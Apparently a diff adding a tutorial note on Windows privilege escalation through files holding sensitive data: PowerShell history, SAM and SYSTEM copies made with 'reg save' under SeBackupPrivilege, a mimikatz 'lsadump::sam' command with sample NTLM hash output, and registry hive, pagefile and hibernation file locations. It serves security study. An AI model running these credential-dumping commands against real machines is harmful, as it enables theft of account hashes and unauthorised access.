@@ -1,0 +1,271 @@
+                     ______________________________
+
+                      WINDOWS PRIVILEGE ESCALATION
+                       Files with Sensitive Data
+
+                                Hexdump
+                     ______________________________
+
+
+Table of Contents
+_________________
+
+1. History Logs
+.. 1. History
+.. 2. Transcript
+2. Security Accounts Manager (SAM + SYSTEM)
+.. 1. SAM Dump with SeBackupPrivilege
+.. 2. Mimikatz to dump LSASS Process
+3. Registry Hives
+4. Extra
+.. 1. Configuration Files
+.. 2. Paging File
+.. 3. Hibernation File
+5. References
+
+
+1 History Logs
+==============
+
+  Any command we write using powershell could be saved in the history.
+
+
+1.1 History
+~~~~~~~~~~~
+
+  Get history in memory
+  ,----
+  | Get-History
+  `----
+
+  Get file where the history is saved
+  ,----
+  | (Get-PSReadlineOption).HistorySavePath
+  `----
+
+  Default locations:
+
+  - Windows
+    ,----
+    | %UserProfile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+    `----
+
+  - Linux
+    ,----
+    | $HOME/.local/share/powershell/PSReadLine/ConsoleHost_history.txt
+    `----
+
+
+1.2 Transcript
+~~~~~~~~~~~~~~
+
+  The `transcript' is used to keep track of execute commands. If not
+  properly handled, it could could sensitive data and therefore
+  represent a security risk.
+
+  Start transcript and save into a file
+  ,----
+  | Start-Transcript -Path "C:\Users\Quickemu\Desktop\Log.txt"
+  `----
+
+  Stop transcript
+  ,----
+  | Stop-Transcript
+  `----
+
+
+2 Security Accounts Manager (SAM + SYSTEM)
+==========================================
+
+  The SAM (Security Accounts Manager) file is a critical component of
+  Windows that stores user account credentials for local accounts.
+
+  The SAM file contains various things, including
+
+  - Usernames and password hashes
+  - Account Information
+    - Security Identifiers (SIDs)
+  - Group Memberships
+
+  The SAM file is located in the directory
+  ,----
+  | C:\Windows\System32\config
+  `----
+
+  By default it cannot be directly accessed, since it is locked by the
+  operating system. Sometimes it is however possible to find backup
+  copies of it.
+
+
+2.1 SAM Dump with SeBackupPrivilege
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+  However, by having the `SeBackupPrivilege', it is possible to create
+  copies of the SAM and SYSTEM files.
+
+  ----------------------------------------------------------------------
+
+  The `SeBackupPrivilege' is a system privilege that allows users or
+  services to back up files. Since some files are locked for various
+  reasons, the privilege allows users or services to bypass normal file
+  security restrictions.
+
+  It is granted to backup operators, system administrators, and trusted
+  backup software.
+
+  Since the privilege by design allows to bypass security restrictions,
+  it introduces a *securiry risk* to consider. The privilege should
+  therefore be restricted to only those who stricly need it.
+
+  To assign the feature to a user, you can assign the user to the
+  `Backup Operators', which is a group specifically designed for users
+  who need the `SeBackupPrivilege'.
+
+  ,----
+  | Add-LocalGroupMember -Group "Backup Operators" -Member "Leonardo"
+  `----
+
+  Once we have that privilege, it is possible to copy SAM and SYSTEM as
+  follows
+
+  ,----
+  | reg save hklm\sam C:\Users\Leonardo\Desktop\SAM.hive
+  | reg save hklm\system C:\Users\Leonardo\Desktop\SYSTEM.hive
+  `----
+
+
+2.2 Mimikatz to dump LSASS Process
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+  We can use `mimikatz' to dump the hashes saved within the Local
+  Security Authority Subsystem Service (LSASS).
+
+  ,----
+  | mimikatz64.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
+  `----
+
+  We will see something of the sort
+
+  ,----
+  | RID  : 000003e8 (1000)
+  | User : Quickemu
+  |   Hash NTLM: 2b576acbe6bcfda7294d6bd18041b8fe
+  | ...
+  | RID  : 000003e9 (1001)
+  | User : Leonardo
+  |   Hash NTLM: fd3e9753bc655918982e7f9c08b4b022
+  `----
+
+
+3 Registry Hives
+================
+
+  The Windows registry is a hierarchical database structured following a
+  tree-like data structure into `registry hives'.
+
+  Each hive is made up of multiple keys and values, and these hives are
+  stored as files on the system.
+
+  These data sources are very useful for `threat intelligence', as they
+  can be used as `Indicator of Compromise' (IOC) for specific malware.
+
+  - `HKEY_CLASSES_ROOT (HKCR)'
+
+    ,----
+    | C:\Windows\System32\Config\Software
+    `----
+
+  - `HKEY_LOCAL_MACHINE (HKLM)'
+
+    ,----
+    | C:\Windows\System32\Config\SYSTEM
+    `----
+
+  - `HKEY_USERS (HKU)'
+
+  ,----
+  | C:\Windows\System32\Config\DEFAULT
+  `----
+
+  - `HKEY_CURRENT_USER (HKCU)'
+
+    ,----
+    | C:\Users\<UserName>\NTUSER.DAT
+    `----
+
+  - `HKEY_CURRENT_CONFIG (HKCC)'
+
+    ,----
+    | C:\Windows\System32\Config\SystemProfile  
+    `----
+
+  ----------------------------------------------------------------------
+
+  To explore the contents of a hive there is the `regipy' python
+  package.
+
+  ,----
+  | python3 -m venv venv
+  | . venv/bin/activate
+  | pip3 install regipy
+  `----
+
+  ,----
+  | #!/usr/bin/env python3
+  | 
+  | from regipy.registry import RegistryHive
+  | 
+  | def list_registry_keys(hive_path):
+  |     # Load the registry hive
+  |     hive = RegistryHive(hive_path)
+  |     for entry in hive.recurse_subkeys(as_json=True):
+  |         print(entry)        
+  | 
+  | if __name__ == "__main__":
+  |     list_registry_keys("./SYSTEM")
+  `----
+
+
+4 Extra
+=======
+
+4.1 Configuration Files
+~~~~~~~~~~~~~~~~~~~~~~~
+
+  Certain location are most often used by application to store
+  configuration files.
+
+  ,----
+  | %AppData%
+  | %LocalAppData%
+  `----
+
+
+4.2 Paging File
+~~~~~~~~~~~~~~~
+
+  If paging is enabled, the system will create a `pagefile.sys' file.
+
+  ,----
+  | C:\pagefile.sys
+  `----
+
+
+4.3 Hibernation File
+~~~~~~~~~~~~~~~~~~~~
+
+  When the hibernation feature is enabled, windows will store the
+  content of the system's RAM into the file `hiberfil.sys' when the
+  computer is put into hibernation.
+
+  ,----
+  | C:\hiberfil.sys
+  `----
+
+
+5 References
+============
+
+  Mimikatz <https://github.com/gentilkiwi/mimikatz>
+
+  Regipy <https://github.com/mkorman90/regipy>
